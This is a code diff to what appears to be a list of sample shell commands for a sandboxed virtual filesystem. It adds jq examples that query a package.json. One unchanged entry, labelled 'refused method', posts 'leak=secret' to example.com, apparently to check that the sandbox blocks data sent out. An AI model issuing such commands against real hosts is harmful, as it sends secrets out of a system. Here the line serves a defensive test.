@@ -604,8 +604,18 @@
     // serves content rather than API calls and does not run out.
     [
       "fetch some JSON",
-      "curl -s https://raw.githubusercontent.com/corca-ai/cf-vfs/main/package.json | grep -o '\"version\": \"[^\"]*\"'",
+      "curl -s https://raw.githubusercontent.com/corca-ai/cf-vfs/main/package.json | jq -r .version",
     ],
+    [
+      "query it",
+      "curl -s https://raw.githubusercontent.com/corca-ai/cf-vfs/main/package.json | jq -r '.exports | keys | .[:6][]'",
+    ],
+    [
+      "shape it",
+      "curl -s https://raw.githubusercontent.com/corca-ai/cf-vfs/main/package.json | jq -c '{name, version, scripts: (.scripts | keys | length)}'",
+    ],
+    ["jq on a literal", "echo '[{\"n\":3},{\"n\":1}]' | jq -c 'sort_by(.n) | map(.n)'"],
+    ["jq refuses the rest", "echo '{}' | jq 'def f: .; f'"],
     ["refused origin", "curl -s https://example.net/ ; echo \"exit $?\""],
     ["refused method", "curl -s -d leak=secret https://example.com/"],
     ["disk usage", "du -sh / 2>/dev/null; df 2>/dev/null || stat -c '%s %n' notes.txt"],
